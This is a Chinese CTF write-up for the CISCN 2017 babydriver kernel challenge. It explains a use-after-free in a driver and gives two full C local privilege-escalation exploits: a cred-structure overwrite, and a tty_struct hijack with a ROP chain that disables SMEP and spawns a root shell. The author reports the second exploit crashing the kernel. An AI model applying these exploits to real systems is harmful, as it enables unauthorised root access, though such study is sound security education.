---
layout: post
tags: [kernel_pwn]
title: "ciscn 2017 babydriver 复现"
date: 2022-10-20
author: wsxk
comments: true
---

- [题目分析<br>](#题目分析)
- [漏洞利用<br>](#漏洞利用)
  - [1.通过劫持进程cred结构体获得root<br>](#1通过劫持进程cred结构体获得root)
  - [2.堆块隔离绕过<br>](#2堆块隔离绕过)
  - [ptmx<br>](#ptmx)
  - [堆块隔离绕过时存在的问题<br>](#堆块隔离绕过时存在的问题)
- [references<br>](#references)

## 题目分析<br>
关键函数如下
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221021195941.png)<br>
问题出现在`babyopen`和`babyrelease`函数上（在打开设备和关闭设备时运行的函数）
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221021200430.png)<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221021200525.png)<br>
如果在同一个程序上open 该设备两次，会获得2个fd，2个fd同时具有对babydev_struct的控制权（`babydev_struct是一个全局变量`)<br>
此时如果close一个fd，但是指针没有置0，存在`UAF`漏洞<br>

## 漏洞利用<br>
关于`UAF`漏洞的利用，常见思路是`劫持存在函数指针的结构体`<br>
具体原理是，linux内核的所有结构体都是通过`slub分配器`分配的，如果你free了一个内核的chunk，之后进行某些操作时，内核又需要申请chunk，且free的chunk和申请的chunk大小一致，那么你free的chunk就会分配给内核。如果内核使用的chunk存在函数指针，我们就可以通过修改函数指针来完成控制流劫持。（slub详情请翻阅前文）<br>
### 1.通过劫持进程cred结构体获得root<br>
原始做法，释放chunk后，通过fork创建子进程，通过劫持子进程cred结构体，设置uid和gid为0，获得shell。十分简单<br>
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

int main(void)
{
    printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");

    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    ioctl(fd1, 0x10001, 0xa8);
    close(fd1);

    int pid = fork();

    if(pid < 0)
    {
        printf("\033[31m\033[1m[x] Unable to fork the new thread, exploit failed.\033[0m\n");
        return -1;
    }
    else if(pid == 0) // the child thread
    {
        char buf[30] = {0};
        write(fd2, buf, 28);

        if(getuid() == 0)
        {
            printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
            system("/bin/sh");
            return 0;
        }
        else
        {
            printf("\033[31m\033[1m[x] Unable to get the root, exploit failed.\033[0m\n");
            return -1;
        }
    }
    else // the parent thread
    {
        wait(NULL);//waiting for the child
    }

    return 0;
}
```
<br>

### 2.堆块隔离绕过<br>
因此本次题目的linux版本为`4.4.72`比较古老，没有堆块隔离，所以可以通过上述方法进行进攻<br>
从`4.5.0`开始，linux实现了堆块隔离<br>
```c
void __init cred_init(void)
{
    /* allocate a slab in which we can store credentials */
    cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0,
            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
}
```
重点关注`SLAB_ACCOUNT`标志，在4.5以前的版本中，并没有该标志，改标志使得创建名为`cred_jar`的结构体时，不会与相同大小的 `kmalloc-192` 合并（大概意思是，原来cred_jar和kmalloc-192其实是同一个cache）。<br>
因此从4.5版本后，使用该攻击手法无法劫持cred结构体。<br>
因此尝试新办法。<br>

### ptmx<br>
在 `/dev` 下有一个伪终端设备 ptmx ，在我们打开这个设备时内核中会创建一个 tty_struct 结构体，与其他类型设备相同，tty驱动设备中同样存在着一个存放着函数指针的结构体 `tty_operations`，并且该结构体并没有开启堆块隔离。<br>
因此思路如下：通过劫持tty_struct结构体控制`tty_operations`，修改函数指针，关闭`SMEP`保护，进行  `stack migration`,然后执行提权。<br>
代码如下：
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

size_t commit_creds=0;
size_t prepare_kernel_cred =0;

size_t user_cs;
size_t user_ss;
size_t user_sp;
size_t user_rflags;
void save_status(void){
    __asm__(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void get_root_shell(void){
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }
    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

//ret2usr
void get_root_privilege(void){
    //printf("use ret2usr\n"); //don't use user func in kernel space!
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

size_t pop_rdi_ret = 0xffffffff810d238d;
size_t mov_cr4_rdi_pop_rbp_ret = 0xffffffff81004d80;
size_t swapgs_pop_rbp_ret = 0xffffffff81063694;
size_t iretq_ret = 0xffffffff814e35ef;
size_t mov_rsp_rax_dec_ebx_ret = 0xffffffff8181bfc5;
size_t pop_rax_ret = 0xffffffff8100ce6e;
size_t mov_rdi_rax_call_rdx = 0xffffffff810dec19;
size_t pop_rdx_ret = 0xffffffff81440b72;
size_t pop_rcx_ret = 0xffffffff8100700c;

int main(void)
{
    save_status();
    prepare_kernel_cred =0xffffffff810a1810;
    commit_creds = 0xffffffff810a1420;
    //make rop
    size_t rop[0x20];
    int i=0;
    rop[i++] = pop_rdi_ret;
    rop[i++] = 0x6f0; // close smap/smep ,usual cr4 value
    rop[i++] = mov_cr4_rdi_pop_rbp_ret;
    rop[i++] = 0;
    rop[i++] = pop_rdi_ret;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = pop_rdx_ret;
    rop[i++] = pop_rcx_ret;
    rop[i++] = mov_rdi_rax_call_rdx;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_pop_rbp_ret;
    rop[i++] = 0;
    rop[i++] = iretq_ret;
    rop[i++] = get_root_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
    printf("rop_addr: %p\n",rop);

    size_t fake_op[0x20];
    for(i=0;i<0x20;i++){
        fake_op[i] = mov_rsp_rax_dec_ebx_ret;
    }
    fake_op[0] = pop_rax_ret;
    fake_op[1] = rop;
    printf("fake_op_addr:%p\n",fake_op);

    int fd1 = open("/dev/babydev",O_RDWR);
    int fd2 = open("/dev/babydev",O_RDWR);
    ioctl(fd1,0x10001,0x2c0);//change the size
    close(fd1);
    size_t tty_struct[0x20];
    int fd3 = open("/dev/ptmx",O_RDWR);
    read(fd2,tty_struct,0x40);
    printf("original_op_addr:%p\n",tty_struct[3]);
    tty_struct[3] = fake_op;
    write(fd2,tty_struct,0x40);
    write(fd3,tty_struct,0x40);
    system("pause");
    return 0;
}
```

### 堆块隔离绕过时存在的问题<br>
在实现绕过时，一开始尝试了ret2usr发现程序确实能拿到root，但是，或许shell时，内核炸了...
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-6-27-DNS/20221021202920.png)
刚开始以为ret2usr有问题，后来改成了纯粹的内核ROP，发现还是出现上图的情况<br>
在调试时，我发现我并不能运行到获得root权限的代码。（准确的说，无论我断在哪个点上，gdb单步运行一次会导致内核崩溃重启）。<br>
暂时没有找到解决办法，猜测是qemu版本太老导致的问题。<br>

## references<br>
[vmware下ubuntu不支持kvm虚拟化](https://blog.csdn.net/weixin_43168105/article/details/88240280)<br>
[ubuntu20.04 kvm测试及安装](https://blog.csdn.net/twotwo22222/article/details/126767604)<br>
